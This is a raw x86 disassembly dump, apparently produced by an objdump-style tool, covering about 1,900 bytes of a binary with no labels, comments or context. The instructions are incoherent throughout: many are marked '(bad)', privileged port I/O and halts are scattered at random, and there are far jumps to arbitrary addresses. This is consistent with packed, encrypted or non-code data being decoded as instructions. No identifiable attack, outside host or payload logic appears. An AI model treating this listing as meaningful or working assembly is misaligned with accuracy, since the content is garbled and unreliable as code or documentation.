  4066b6:	jecxz  0x4066da
  4066b8:	mov    al,ds:0x40ae1299
  4066bd:	xor    esi,DWORD PTR [ecx]
  4066bf:	dec    edx
  4066c0:	dec    edi
  4066c1:	xchg   esp,eax
  4066c2:	push   ebx
  4066c3:	aaa    
  4066c4:	xchg   ebx,eax
  4066c5:	pusha  
  4066c6:	fldenv [esi]
  4066c8:	mov    eax,ds:0xd9f6676e
  4066cd:	(bad)  
  4066ce:	sahf   
  4066cf:	jp     0x4066e5
  4066d1:	rcl    DWORD PTR [eax-0x75a07757],1
  4066d7:	mov    esp,0x6b0de2aa
  4066dc:	out    dx,al
  4066dd:	xor    al,0x68
  4066df:	mov    ds:0x6f67d2ef,al
  4066e4:	inc    eax
  4066e5:	dec    edi
  4066e6:	or     edi,DWORD PTR [edx+eax*4+0x44632d75]
  4066ed:	inc    esi
  4066ee:	mov    ah,0xf7
  4066f0:	loopne 0x4066c0
  4066f2:	jecxz  0x406698
  4066f4:	and    bl,BYTE PTR [eax-0x56323e9]
  4066fa:	pop    ss
  4066fb:	xchg   esi,eax
  4066fc:	xor    eax,0xf7d13a8d
  406701:	fadd   st,st(2)
  406703:	jo     0x406776
  406705:	xchg   ebp,eax
  406706:	and    al,0x90
  406708:	inc    edi
  406709:	hlt    
  40670a:	mov    ebp,0xc56d38ec
  40670f:	ss pop es
  406711:	ret    0x1c94
  406714:	call   0xaaea:0xd4db7229
  40671b:	sbb    DWORD PTR [ebp+0x30],ebp
  40671e:	dec    eax
  40671f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406720:	into   
  406721:	lar    ecx,WORD PTR [ebx]
  406724:	pop    eax
  406725:	test   eax,0x4b054784
  40672a:	sub    al,0xee
  40672c:	lds    esi,FWORD PTR [ebx+edx*8]
  40672f:	adc    al,0x66
  406732:	in     eax,dx
  406733:	pop    ds
  406734:	xor    BYTE PTR [ecx-0x4d2cf190],dl
  40673a:	mov    al,0x2d
  40673c:	push   edi
  40673d:	adc    al,BYTE PTR [ecx]
  40673f:	jb     0x406772
  406741:	sahf   
  406742:	sti    
  406743:	xor    esi,ebp
  406745:	sbb    DWORD PTR [edx+ebx*8],ecx
  406748:	mov    bh,0x25
  40674a:	retf   0xce0d
  40674d:	jo     0x4067af
  40674f:	test   cl,ah
  406751:	dec    esi
  406752:	aas    
  406753:	xchg   ebx,eax
  406754:	dec    edx
  406755:	cli    
  406756:	inc    edi
  406757:	std    
  406758:	iret   
  406759:	mov    esp,0xe84962fa
  40675e:	adc    eax,0x4e10aba3
  406763:	mov    ah,0x83
  406765:	rcl    esi,cl
  406767:	push   edi
  406768:	sbb    ecx,edi
  40676a:	xor    dh,BYTE PTR [eax-0x10]
  40676d:	loope  0x4067b0
  40676f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406770:	rcl    DWORD PTR [ecx+0x7d016b15],cl
  406776:	cmp    ebp,esp
  406778:	cmc    
  406779:	mov    al,ds:0x98b90a72
  40677e:	test   DWORD PTR [eax-0x4e],esi
  406781:	mov    bl,0x73
  406783:	adc    BYTE PTR [edx-0xe1d6388],0x2e
  40678a:	sar    cl,1
  40678c:	adc    ah,BYTE PTR [edx+0x28b701f2]
  406792:	outs   dx,BYTE PTR ds:[esi]
  406793:	mov    ecx,esi
  406795:	lock (bad) 
  406797:	cmc    
  406798:	jmp    0x406803
  40679a:	out    0xf,al
  40679c:	mov    WORD PTR [edx+0x73723e8d],?
  4067a2:	jb     0x406724
  4067a4:	rcr    DWORD PTR [esi+0x62dda018],cl
  4067aa:	pop    esp
  4067ab:	test   BYTE PTR [eax-0x8],bh
  4067ae:	pop    edi
  4067af:	test   dl,dh
  4067b1:	retf   
  4067b2:	and    DWORD PTR [ebx],ecx
  4067b4:	jmp    0x4d138173
  4067b9:	sbb    DWORD PTR [ebx],esp
  4067bb:	fsub   QWORD PTR [edi]
  4067bd:	mov    WORD PTR [ebp+0x39],fs
  4067c0:	cmc    
  4067c1:	jmp    0x406746
  4067c3:	outs   dx,BYTE PTR ds:[esi]
  4067c4:	push   edi
  4067c5:	push   ecx
  4067c6:	mov    esi,0x252d397
  4067cb:	pushf  
  4067cc:	sub    DWORD PTR [eax],0x7ea9cf0
  4067d2:	lea    edx,fs:[ebx-0x70a69c8f]
  4067d9:	and    bh,BYTE PTR [ebx+0x6cf56867]
  4067df:	fucompp 
  4067e1:	xchg   esp,esi
  4067e3:	repz cmp ebx,DWORD PTR [ebx+0x1f4435f4]
  4067ea:	scas   al,BYTE PTR es:[edi]
  4067eb:	je     0x4067cc
  4067ed:	retf   0x8357
  4067f0:	aas    
  4067f1:	jl     0x4067b5
  4067f3:	(bad)  
  4067f4:	fwait
  4067f5:	retf   0x99c8
  4067f8:	fs pop ds
  4067fa:	xor    eax,0xb02d604
  4067ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406800:	push   edi
  406801:	leave  
  406802:	xchg   ecx,eax
  406803:	lock lea eax,[eax+ebp*8]
  406807:	and    DWORD PTR [ebp+0x77],0xb6ce9df5
  40680e:	imul   esp,DWORD PTR [ebp-0x7778bab6],0x24
  406815:	push   es
  406816:	xor    al,0x90
  406818:	sbb    edi,DWORD PTR [eax-0x22]
  40681b:	lods   eax,DWORD PTR ds:[esi]
  40681c:	ds leave 
  40681e:	(bad)  
  40681f:	dec    esi
  406820:	push   ds
  406821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406822:	or     bl,dh
  406824:	push   0x56
  406826:	hlt    
  406827:	hlt    
  406828:	out    0x8a,al
  40682a:	and    esp,DWORD PTR [ebp-0x7aa057ce]
  406830:	inc    esi
  406831:	xor    cl,ch
  406833:	fdiv   st(2),st
  406835:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406836:	xchg   ebp,eax
  406837:	cmp    edx,DWORD PTR [ebp-0x145dfba8]
  40683d:	jmp    0x8a578f96
  406842:	addr16 jb 0x406856
  406845:	ins    DWORD PTR es:[edi],dx
  406846:	mov    ebp,0x1987eab5
  40684b:	(bad)  
  40684c:	jge    0x406878
  40684e:	dec    ebx
  40684f:	mov    BYTE PTR [ecx-0x62c76c53],dh
  406855:	add    eax,esi
  406857:	inc    ecx
  406858:	js     0x4068be
  40685a:	out    0x32,al
  40685c:	lods   al,BYTE PTR ds:[esi]
  40685d:	xchg   edi,eax
  40685e:	nop
  40685f:	ds cmp al,0x2e
  406862:	push   ebp
  406863:	iret   
  406864:	call   0x45bb28f0
  406869:	push   0x8fc15269
  40686e:	xor    BYTE PTR [esi],dl
  406870:	cmp    al,0xf8
  406872:	(bad)  
  406873:	push   esi
  406874:	pop    ss
  406875:	scas   al,BYTE PTR es:[edi]
  406876:	inc    eax
  406877:	repz imul ecx,ebx,0xffffffae
  40687b:	loopne 0x4068e4
  40687d:	sub    ch,BYTE PTR [ecx-0x61]
  406880:	add    edi,DWORD PTR [edx+0x1e]
  406883:	scas   al,BYTE PTR es:[di]
  406885:	or     cl,cl
  406887:	jno    0x40687f
  406889:	(bad)  
  40688a:	retf   
  40688b:	push   es
  40688c:	repz mov WORD PTR [eax+0x71d92b89],fs
  406893:	fdiv   DWORD PTR [eax]
  406895:	inc    eax
  406896:	shr    BYTE PTR [ebx],1
  406898:	mov    DWORD PTR [esi-0x48],0x5394f94e
  40689f:	sbb    DWORD PTR [ebp-0x12644691],0xffffffef
  4068a6:	stc    
  4068a7:	lock pop ecx
  4068a9:	ffree  st(7)
  4068ab:	mov    esi,0x5acf8d48
  4068b0:	fnstenv gs:[ecx+eiz*4-0x7905b74c]
  4068b8:	loope  0x406930
  4068ba:	jmp    0x3dda4edb
  4068bf:	(bad)  
  4068c0:	jbe    0x406863
  4068c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068c3:	xchg   ecx,eax
  4068c4:	pop    ebx
  4068c5:	daa    
  4068c6:	imul   eax,ecx,0x95dbb0ca
  4068cc:	cli    
  4068cd:	sbb    eax,0x869b0f69
  4068d2:	xor    al,0xff
  4068d4:	popf   
  4068d5:	inc    edx
  4068d6:	and    al,0x42
  4068d8:	xor    bh,BYTE PTR [ebp+0x4b]
  4068db:	inc    edi
  4068dc:	shl    dh,0x55
  4068df:	stos   DWORD PTR es:[edi],eax
  4068e0:	adc    BYTE PTR ds:0x77ca497a,0xaf
  4068e7:	mov    ebx,0xd5588dbe
  4068ec:	or     al,0x38
  4068ee:	jl     0x4068ba
  4068f0:	push   ebx
  4068f1:	add    bl,ah
  4068f3:	push   edi
  4068f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068f5:	data16 stos BYTE PTR es:[edi],al
  4068f7:	lea    ecx,[esi]
  4068f9:	inc    esp
  4068fa:	mov    ecx,0x3b28ee24
  4068ff:	lods   al,BYTE PTR ds:[esi]
  406900:	push   ecx
  406901:	mov    ds:0xb9bfc222,eax
  406906:	adc    eax,0x42c9dc2e
  40690b:	sar    DWORD PTR [edx],1
  40690d:	xchg   esi,eax
  40690e:	fbstp  TBYTE PTR [ebx-0x23]
  406911:	mov    bl,0xbc
  406913:	add    ebp,esp
  406915:	pop    ecx
  406916:	dec    esp
  406917:	cmp    eax,0x89b9d766
  40691c:	rcr    DWORD PTR [ebx+ebx*1-0x420a8334],0x4d
  406924:	push   esp
  406925:	sbb    ecx,DWORD PTR [ebx+edx*4+0x71]
  406929:	fdivr  st(4),st
  40692b:	not    BYTE PTR [esi-0x7a]
  40692e:	fild   DWORD PTR [esi-0x3c]
  406931:	dec    esi
  406932:	pop    eax
  406933:	pop    eax
  406934:	sbb    BYTE PTR [edx-0x41],dl
  406937:	jb     0x4069a2
  406939:	pop    ebx
  40693a:	adc    ebx,esp
  40693c:	push   eax
  40693d:	mov    al,ds:0xe8c2e588
  406942:	inc    edx
  406943:	mov    dh,BYTE PTR [ebx+0x4e]
  406946:	bound  edi,QWORD PTR [eax+0x64f15fd9]
  40694c:	aaa    
  40694d:	repnz xor cl,ah
  406950:	stos   DWORD PTR es:[edi],eax
  406951:	and    ah,BYTE PTR [eax+0x5a]
  406954:	in     eax,dx
  406955:	enter  0x4221,0x28
  406959:	xlat   BYTE PTR ds:[ebx]
  40695a:	dec    edx
  40695b:	lods   al,BYTE PTR ds:[esi]
  40695c:	dec    esp
  40695d:	fwait
  40695e:	or     al,0x79
  406960:	and    DWORD PTR [esi-0x21],0x52958556
  406967:	hlt    
  406968:	and    BYTE PTR [edi+0x68003459],0x90
  40696f:	arpl   WORD PTR [edx+0x5ef33a2d],dx
  406975:	and    al,BYTE PTR [eax+0x7f]
  406978:	ret    
  406979:	adc    DWORD PTR [ebp-0x3cdc5de1],esi
  40697f:	xor    DWORD PTR [eax-0x2be76f4d],0xb97b05f7
  406989:	sbb    DWORD PTR [edi+0x38f1ee8],0x17
  406990:	jg     0x406928
  406992:	mov    ch,0xa3
  406994:	dec    edi
  406995:	outs   dx,BYTE PTR ds:[esi]
  406996:	shl    DWORD PTR ds:0xadc3a202,0xda
  40699d:	inc    ebx
  40699e:	mov    edx,DWORD PTR [esp+eax*1-0x6821693c]
  4069a5:	inc    eax
  4069a7:	mov    ah,0x9a
  4069a9:	icebp  
  4069aa:	jb     0x406970
  4069ac:	pop    es
  4069ad:	ins    BYTE PTR es:[edi],dx
  4069ae:	xchg   ecx,eax
  4069af:	test   eax,0x99c0cb1c
  4069b4:	xor    al,al
  4069b6:	in     al,dx
  4069b7:	adc    al,0xa
  4069b9:	mov    ss,WORD PTR [edi+ecx*1]
  4069bc:	adc    al,0x6
  4069be:	sub    edi,DWORD PTR [edi-0x55fe6242]
  4069c4:	pop    edi
  4069c5:	inc    esp
  4069c6:	retf   
  4069c7:	mov    ebx,0xae350d9f
  4069cc:	imul   esi,DWORD PTR ds:0xd4ae67c4,0xa296d688
  4069d6:	jle    0x406969
  4069d8:	sti    
  4069d9:	pop    ss
  4069da:	das    
  4069db:	adc    eax,0xc744beb7
  4069e0:	xchg   ebx,eax
  4069e1:	cli    
  4069e2:	ins    DWORD PTR es:[edi],dx
  4069e3:	(bad)  
  4069e4:	push   ebx
  4069e5:	(bad)  [ebx+0x1a27e62]
  4069eb:	mov    edx,0x8e896441
  4069f0:	test   eax,0xa508a7fa
  4069f5:	add    al,0xce
  4069f7:	lahf   
  4069f8:	jge    0x406a5d
  4069fa:	or     esi,ebx
  4069fc:	push   esi
  4069fd:	push   ebx
  4069fe:	sbb    al,0xc1
  406a00:	dec    edi
  406a01:	fcmovu st,st(3)
  406a03:	pop    edi
  406a04:	or     dl,cl
  406a06:	and    BYTE PTR [esi-0x38],ch
  406a09:	scas   al,BYTE PTR es:[edi]
  406a0a:	pop    eax
  406a0b:	xor    eax,0x9b75a76c
  406a10:	nop
  406a11:	fld    DWORD PTR [edx+0x38972eba]
  406a17:	call   DWORD PTR [edi]
  406a19:	xlat   BYTE PTR ds:[ebx]
  406a1a:	adc    ebp,ecx
  406a1c:	jns    0x4069cb
  406a1e:	xchg   esp,eax
  406a1f:	stos   BYTE PTR es:[edi],al
  406a20:	or     esp,DWORD PTR [ebp+0x72153667]
  406a26:	jmp    0x5ae57edd
  406a2b:	add    DWORD PTR [edx-0x4c],0x427ea3e6
  406a32:	popf   
  406a33:	data16 movs BYTE PTR es:[edi],BYTE PTR fs:[esi]
  406a36:	inc    esi
  406a37:	adc    BYTE PTR [edx+0x48f82f1c],ah
  406a3d:	mov    eax,0xab4438ed
  406a42:	or     ah,BYTE PTR [ecx]
  406a44:	pusha  
  406a45:	ins    DWORD PTR es:[edi],dx
  406a46:	lods   eax,DWORD PTR ds:[esi]
  406a47:	or     al,BYTE PTR [ebx]
  406a49:	cwde   
  406a4a:	mov    ds:0xb999c2c1,al
  406a4f:	lods   eax,DWORD PTR ds:[esi]
  406a50:	pop    ecx
  406a51:	fs mov bl,0xa4
  406a54:	mov    al,ds:0x969c32f2
  406a59:	in     al,0xa2
  406a5b:	or     eax,0x6601ce92
  406a60:	jb     0x406ac5
  406a62:	xor    DWORD PTR [eax-0x3d4d267e],ebp
  406a68:	popa   
  406a69:	sbb    al,0xb5
  406a6b:	cmp    eax,0x9e332b00
  406a70:	test   al,0x1c
  406a72:	ss mov WORD PTR ss:[edx-0x749db272],?
  406a7a:	jne    0x406a41
  406a7c:	xchg   DWORD PTR [ecx+0x5],eax
  406a7f:	cdq    
  406a80:	addr16 push 0x94668dde
  406a86:	mov    ecx,0xea0463fe
  406a8b:	inc    ecx
  406a8c:	gs jp  0x406a12
  406a8f:	dec    ebx
  406a90:	adc    eax,0x259c6db1
  406a95:	ficomp DWORD PTR [edi+0x446d094b]
  406a9b:	adc    BYTE PTR [ebp+0x9bfa055],0xa8
  406aa2:	test   dh,bh
  406aa4:	mov    eax,0xd9351d54
  406aa9:	mov    dh,0xa1
  406aab:	dec    ecx
  406aac:	outs   dx,BYTE PTR ds:[esi]
  406aad:	adc    BYTE PTR [edi],dl
  406aaf:	push   edx
  406ab0:	add    BYTE PTR [eax],ch
  406ab2:	imul   edx,DWORD PTR [ebx+0x24517cd],0xffffffec
  406ab9:	ret    
  406aba:	rol    DWORD PTR [ebx-0x6f786c37],0x1b
  406ac1:	pop    ds
  406ac2:	mov    ds:0x75b1f008,al
  406ac7:	in     eax,dx
  406ac8:	mov    ds:0x77214a21,eax
  406acd:	jle    0x406b10
  406acf:	ret    
  406ad0:	xchg   BYTE PTR [eax],ch
  406ad2:	mov    BYTE PTR [edi],0x0
  406ad5:	jle    0x406ae8
  406ad7:	hlt    
  406ad8:	dec    ecx
  406ad9:	pop    edi
  406ada:	test   DWORD PTR [edi-0x1f],0xd64c6133
  406ae1:	repz sti 
  406ae3:	ja     0x406aa3
  406ae5:	rcl    BYTE PTR [eax-0x73],0xd5
  406ae9:	and    al,0x78
  406aeb:	and    BYTE PTR [edx+0x4406c014],bh
  406af1:	xor    eax,ecx
  406af3:	outs   dx,BYTE PTR ds:[esi]
  406af4:	mov    bl,0x82
  406af6:	ret    0x2eef
  406af9:	and    eax,DWORD PTR [esi-0x3e]
  406afc:	jp     0x406b37
  406afe:	or     esi,DWORD PTR [ecx+ebx*4-0x31c96547]
  406b05:	jge    0x406b7e
  406b07:	es dec esp
  406b09:	aad    0x97
  406b0b:	adc    cl,bh
  406b0d:	jnp    0x406abc
  406b0f:	nop
  406b10:	(bad)  
  406b11:	sbb    ebx,DWORD PTR [ebx+0x79]
  406b14:	out    dx,eax
  406b15:	add    eax,0x31b8ceb1
  406b1a:	jge    0x406ac2
  406b1c:	add    dl,al
  406b1e:	or     BYTE PTR ds:0xc31eeda2,ah
  406b24:	inc    ecx
  406b25:	mov    bl,0x24
  406b27:	loop   0x406b64
  406b29:	aas    
  406b2a:	push   0x55b79699
  406b2f:	test   BYTE PTR [edi-0x3a32aebf],ah
  406b35:	bnd jo 0x406abc
  406b38:	fadd   QWORD PTR [edi+0x5f]
  406b3b:	cwde   
  406b3c:	mov    ds:0x20af15c9,al
  406b41:	jns    0x406b83
  406b43:	loopne 0x406b41
  406b45:	lock fimul WORD PTR [edx+0x1376b9bb]
  406b4c:	dec    ebp
  406b4d:	test   DWORD PTR ds:0x2f28a8a0,edi
  406b53:	nop
  406b54:	mov    dh,0x17
  406b56:	(bad)  
  406b57:	je     0x406b1c
  406b59:	xchg   edi,eax
  406b5a:	pop    ebx
  406b5b:	add    al,0xdb
  406b5d:	dec    edx
  406b5e:	sub    al,0xf8
  406b60:	leave  
  406b61:	pusha  
  406b62:	inc    esi
  406b63:	add    al,0x7b
  406b65:	inc    esi
  406b66:	add    al,0x6a
  406b68:	dec    ebx
  406b69:	icebp  
  406b6a:	push   0x0
  406b6c:	stos   BYTE PTR es:[edi],al
  406b6d:	dec    ebx
  406b6e:	inc    ebp
  406b6f:	dec    ebp
  406b70:	push   ecx
  406b71:	and    dl,dl
  406b73:	addr16 sub al,0x9c
  406b76:	pop    esp
  406b77:	(bad)  
  406b78:	push   ds
  406b79:	pop    esp
  406b7a:	dec    edx
  406b7b:	mov    dh,0x41
  406b7d:	mov    ds:0x7c10ecf7,eax
  406b82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b83:	add    al,0x7d
  406b85:	inc    edi
  406b86:	scas   eax,DWORD PTR es:[edi]
  406b87:	dec    eax
  406b88:	or     al,0xfb
  406b8a:	fisttp QWORD PTR [ecx+edx*8]
  406b8d:	sbb    bh,BYTE PTR [ebp+0x22]
  406b90:	ins    DWORD PTR es:[edi],dx
  406b91:	push   eax
  406b92:	inc    edi
  406b94:	(bad)  
  406b95:	pop    ebx
  406b96:	and    ebx,DWORD PTR [edi]
  406b98:	cmp    DWORD PTR [ecx+0x75e4612c],0xfffffffb
  406b9f:	xor    dh,BYTE PTR [ecx]
  406ba1:	mov    al,0xa
  406ba3:	cmp    dh,BYTE PTR [edi+0x4ec1da54]
  406ba9:	mov    ebx,?
  406bab:	xchg   ebx,eax
  406bac:	clc    
  406bad:	clc    
  406bae:	mov    ds:0x427c7b10,eax
  406bb3:	addr16 inc eax
  406bb5:	les    edi,FWORD PTR [edx+0x2f831862]
  406bbb:	sub    BYTE PTR ss:[eax-0x49],dl
  406bbf:	mov    ebx,DWORD PTR [ecx+0x10ece001]
  406bc5:	or     BYTE PTR [esi-0x7ccae43],al
  406bcb:	mov    ds:0x6927cd53,eax
  406bd0:	cmp    BYTE PTR [ebp-0x6f],dh
  406bd3:	into   
  406bd4:	(bad)  
  406bd5:	xlat   BYTE PTR ds:[ebx]
  406bd6:	jle    0x406b87
  406bd8:	mov    esp,?
  406bda:	into   
  406bdb:	pop    edx
  406bdc:	scas   eax,DWORD PTR es:[edi]
  406bdd:	repz sbb DWORD PTR [esp+ebp*1-0x55],0x68
  406be3:	(bad)  
  406be4:	fidiv  DWORD PTR [edi+0x4a]
  406be7:	out    dx,al
  406be8:	cdq    
  406be9:	adc    eax,0xedef51b1
  406bee:	inc    ecx
  406bef:	mov    esp,0xbf74a9a6
  406bf4:	xchg   edi,eax
  406bf5:	jge    0x406c0c
  406bf7:	mov    ebp,0xb4794964
  406bfc:	inc    ebp
  406bfd:	test   BYTE PTR [edi],cl
  406bff:	push   ss
  406c00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c01:	pop    edi
  406c02:	(bad)  
  406c03:	loop   0x406c34
  406c05:	int    0xf0
  406c07:	fiadd  WORD PTR [ebx]
  406c09:	inc    edi
  406c0a:	jecxz  0x406c6e
  406c0c:	dec    edx
  406c0d:	out    0x3b,eax
  406c0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c10:	jg     0x406c8c
  406c12:	lea    edx,[ecx]
  406c14:	inc    eax
  406c15:	cmp    al,0xac
  406c17:	rcr    BYTE PTR [ebx+0x7e],cl
  406c1a:	nop
  406c1b:	in     al,0x7d
  406c1d:	repnz popa 
  406c1f:	pop    edx
  406c20:	out    0x55,eax
  406c22:	je     0x406c75
  406c24:	shl    BYTE PTR ds:0xa3dcc0d4,0x1c
  406c2b:	push   esp
  406c2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c2d:	jae    0x406c58
  406c2f:	fidiv  WORD PTR [ebp-0x23]
  406c32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c33:	cdq    
  406c34:	dec    ebx
  406c35:	ret    
  406c36:	xchg   ebp,eax
  406c37:	test   DWORD PTR [ebx-0x18dd0a04],edi
  406c3d:	call   0xeb4717be
  406c42:	lahf   
  406c43:	dec    ebp
  406c44:	inc    ebx
  406c45:	in     al,dx
  406c46:	push   ecx
  406c47:	pop    ds
  406c48:	push   edi
  406c49:	cmp    ch,ah
  406c4b:	jl     0x406c2a
  406c4d:	in     al,dx
  406c4e:	mov    ah,0x4f
  406c50:	ja     0x406c53
  406c52:	dec    edi
  406c53:	push   es
  406c54:	popf   
  406c55:	sub    dh,BYTE PTR [edi-0x378f9ca0]
  406c5b:	fs dec eax
  406c5d:	call   0xfed82c63
  406c62:	cmc    
  406c63:	or     dh,0xcd
  406c66:	jmp    0x5ba83ce0
  406c6b:	mov    dl,0xdb
  406c6d:	shl    ah,1
  406c6f:	pop    ebx
  406c70:	mov    eax,0xdc2cdc30
  406c75:	or     eax,0xa2af0c2
  406c7a:	xor    eax,0x4868ccc6
  406c7f:	jg     0x406c42
  406c81:	jmp    0xcc6d:0x3871356a
  406c88:	out    dx,eax
  406c89:	xchg   DWORD PTR [edi+0x81106bb],esi
  406c8f:	xchg   edi,eax
  406c90:	dec    esp
  406c91:	inc    edi
  406c92:	cmp    ch,BYTE PTR [ebx+0x225364c4]
  406c98:	xor    BYTE PTR [ecx-0xc],al
  406c9b:	idiv   bl
  406c9d:	push   ecx
  406c9e:	adc    cl,BYTE PTR [edi]
  406ca0:	adc    bl,ch
  406ca2:	and    eax,0x7a5260de
  406ca7:	lds    eax,FWORD PTR [eax]
  406ca9:	xchg   ecx,eax
  406caa:	sti    
  406cab:	xor    eax,0x9061d8a0
  406cb0:	test   al,0xd9
  406cb2:	jae    0x406ccd
  406cb4:	or     al,0x6
  406cb6:	out    0x3d,eax
  406cb8:	mov    bh,0x0
  406cba:	ror    ebp,cl
  406cbc:	inc    esi
  406cbd:	les    edx,FWORD PTR es:[ebx]
  406cc0:	lock sbb edx,DWORD PTR [eax-0x458ed85]
  406cc7:	add    DWORD PTR [ebx+0x594f37c6],0xffffffe5
  406cce:	into   
  406ccf:	xchg   esp,eax
  406cd0:	jae    0x406d47
  406cd2:	ins    DWORD PTR es:[edi],dx
  406cd3:	stos   DWORD PTR es:[edi],eax
  406cd4:	aad    0x28
  406cd6:	dec    ebx
  406cd7:	or     bl,BYTE PTR [ecx+0x40067b3e]
  406cdd:	popf   
  406cde:	sub    ebp,DWORD PTR [eax]
  406ce0:	sti    
  406ce1:	imul   eax,eax,0x76281849
  406ce7:	shl    DWORD PTR [ecx+0x7f9aba7a],cl
  406ced:	xor    DWORD PTR [esi],esp
  406cef:	or     BYTE PTR [edx+0x42],bl
  406cf2:	sahf   
  406cf3:	push   edx
  406cf4:	jg     0x406ce4
  406cf6:	pop    esp
  406cf7:	sbb    DWORD PTR [ecx+0x78],0x8cd8bcad
  406cfe:	stos   BYTE PTR es:[edi],al
  406cff:	and    al,0x19
  406d01:	aad    0x95
  406d03:	(bad)  
  406d04:	push   eax
  406d05:	(bad)  
  406d06:	in     al,dx
  406d07:	scas   al,BYTE PTR es:[edi]
  406d08:	or     BYTE PTR [esi-0x67],cl
  406d0b:	adc    al,0x71
  406d0d:	arpl   di,bx
  406d0f:	sbb    al,0x29
  406d11:	push   eax
  406d12:	js     0x406cf4
  406d14:	dec    esp
  406d15:	pop    esp
  406d16:	sbb    BYTE PTR [eax+0x15],ah
  406d19:	push   ss
  406d1a:	push   esp
  406d1b:	mov    ds:0x3e2ff37a,eax
  406d20:	rcr    DWORD PTR [eax],1
  406d22:	push   fs
  406d24:	pusha  
  406d25:	cdq    
  406d26:	stc    
  406d27:	dec    edi
  406d28:	xor    al,0xad
  406d2a:	push   di
  406d2c:	jnp    0x406d10
  406d2e:	stc    
  406d2f:	push   cs
  406d30:	cmc    
  406d31:	and    DWORD PTR [ebx-0x4b],edi
  406d34:	data16 adc BYTE PTR [edi+0x68f78e1f],bl
  406d3b:	imul   esp,DWORD PTR [edx+esi*4+0x50],0xded809de
  406d43:	jno    0x406cfc
  406d45:	pusha  
  406d46:	shl    DWORD PTR [edi+eax*1+0x40d4f42],cl
  406d4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d4e:	ror    DWORD PTR [ecx+0x42],0x85
  406d52:	retf   0x3576
  406d55:	repz mov ds:0x27373905,al
  406d5b:	mov    DWORD PTR [esi],esp
  406d5d:	cdq    
  406d5e:	mov    eax,0x6f853a47
  406d63:	cli    
  406d64:	push   cs
  406d65:	inc    ebp
  406d66:	leave  
  406d67:	neg    BYTE PTR [edi+0x5]
  406d6a:	dec    esi
  406d6b:	sub    DWORD PTR [eax],edx
  406d6d:	setne  BYTE PTR [esi+ebx*8+0x62f9a35d]
  406d75:	jl     0x406dd2
  406d77:	add    DWORD PTR [eax+0x11],0x1fc329e
  406d7e:	test   al,0x7f
  406d80:	pop    ss
  406d81:	repnz xor al,0x2f
  406d84:	mov    ecx,0x46320e30
  406d89:	call   0x747e951b
  406d8e:	(bad)  
  406d8f:	push   ss
  406d90:	mov    al,ds:0x4ef67a6d
  406d95:	jge    0x406de6
  406d97:	loop   0x406d77
  406d99:	xor    eax,0x7dfe1737
  406d9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d9f:	pop    esi
  406da0:	test   BYTE PTR [edi+eax*4],ch
  406da3:	mov    al,0x51
  406da5:	xor    eax,0x5124ba8f
  406daa:	imul   eax,DWORD PTR [esi+0x3d],0x9
  406dae:	call   0x25f9523c
  406db3:	loopne 0x406d9a
  406db5:	xchg   ebp,esi
  406db7:	adc    bl,bl
  406db9:	(bad)  
  406dba:	and    eax,0xb80635
  406dbf:	push   ds
  406dc0:	mov    eax,ds:0xf7fd56f9
  406dc5:	aas    
  406dc6:	cmp    bh,dl
  406dc8:	test   dl,al
  406dca:	retf   
  406dcb:	mov    al,0xcf
  406dcd:	push   esi
  406dce:	or     eax,0x54cecc5f
  406dd3:	fistp  QWORD PTR [edi-0x575442ae]
  406dda:	aad    0x62
  406ddc:	stos   BYTE PTR es:[edi],al
  406ddd:	mov    bl,cl
  406ddf:	aaa    
  406de0:	scas   al,BYTE PTR es:[edi]
  406de1:	lea    ebx,[ecx]
  406de3:	fwait
  406de4:	out    dx,al
  406de5:	repnz clc 
  406de7:	lods   eax,DWORD PTR ds:[esi]
  406de8:	stos   DWORD PTR es:[edi],eax
  406de9:	or     eax,0x692a1aad
  406dee:	sti    
  406def:	fimul  WORD PTR [edx+0x7a51226d]
  406df5:	cmp    al,BYTE PTR ds:0xee7fea8d
  406dfb:	loop   0x406d88
  406dfd:	add    al,0xd7
  406dff:	loope  0x406dd7
  406e01:	fwait
  406e02:	mov    bh,0xd5
  406e04:	jmp    0x3eba66eb
  406e09:	add    al,0x52
  406e0b:	sti    
  406e0c:	fistp  WORD PTR [edx+ecx*1+0x7c6cd05d]
  406e13:	and    eax,0x9e311b32
  406e18:	daa    
  406e19:	push   ecx
  406e1a:	xor    al,BYTE PTR [esp+edx*1]
  406e1d:	inc    edx
  406e1e:	mov    ch,0xe2
  406e20:	xor    DWORD PTR fs:0xa530ce2b,ebp
  406e27:	xor    esp,0x578a7cd5
  406e2d:	loope  0x406e7e
  406e2f:	cwde   
  406e30:	in     eax,0xfd
  406e32:	shr    BYTE PTR [ebp+0x3a],1
  406e35:	mov    ebp,0x7684f3ac
  406e3a:	addr16 push cs
  406e3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e3d:	mov    dh,0x28
  406e3f:	mov    eax,0x1f50d5a4
  406e44:	sbb    eax,0x7801d8c2
  406e49:	sbb    eax,0x34f78184
  406e4e:	rcr    DWORD PTR [ecx+0x22bdec97],1
  406e54:	inc    edi
  406e55:	imul   eax,eax,0x6a2a793b
  406e5b:	cmp    bl,ch
  406e5d:	pop    ebp
  406e5e:	pop    esi
  406e5f:	lods   eax,DWORD PTR ds:[esi]
  406e60:	sbb    esp,DWORD PTR [eax]
  406e62:	ja     0x406df1
  406e64:	jl     0x406e22
  406e66:	push   eax
  406e68:	std    
  406e69:	xchg   ecx,eax
  406e6a:	push   0xc7a6928a
  406e6f:	dec    esi
  406e70:	popf   
  406e71:	mov    ah,0x99
  406e73:	pop    eax
  406e74:	int    0x65
  406e76:	push   ecx
  406e77:	push   0x87c67b3f
  406e7c:	xchg   esi,eax
  406e7d:	xor    ch,dl
  406e7f:	je     0x406ed6
